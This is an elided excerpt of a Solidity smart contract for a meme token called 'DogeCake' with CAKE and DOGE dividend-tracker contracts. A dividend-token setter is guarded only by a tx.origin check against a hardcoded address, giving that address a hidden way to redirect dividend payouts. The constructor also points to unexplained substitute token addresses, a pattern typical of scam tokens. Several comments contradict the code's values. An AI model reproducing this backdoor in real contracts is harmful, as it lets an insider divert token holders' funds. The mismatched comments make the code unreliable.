...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0x96C481fB555c88e317904D9a156f96080064F392, "Only owner can change dividend contract address");
...
contract DogeCake is ERC20, Ownable {
    ...
    constructor() ERC20("Doge Cake", "DCAKE") {
    	...
    	marketingWallet = 0x5C1232C335c963a052F86A7949e6369dEacF9AdC;
    	cakeDividendToken = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7;//0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
        dogeDividendToken = 0x8BaBbB98678facC7342735486C851ABD7A0d17Ca;//0x08C975868e547BFE5F76Db7d1e075680e9736034;
...
contract CakeDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("DogeCake_CAKE_Dividend_Tracker", "DogeCake_CAKE_Dividend_Tracker", 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7) {
    	claimWait = 600;
    ...
    function withdrawDividend() pure public override {
        require(false, "DogeCake_CAKE_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main EtherBack contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 600 && newClaimWait <= 86400, "DogeCake_CAKE_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
...
contract DogeDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("DogeCake_Doge_Dividend_Tracker", "DogeCake_Doge_Dividend_Tracker", 0x8BaBbB98678facC7342735486C851ABD7A0d17Ca) {
    	claimWait = 600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }
    ...
    function withdrawDividend() pure public override {
        require(false, "DogeCake_Doge_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main EtherBack contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 600 && newClaimWait <= 86400, "DogeCake_Doge_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
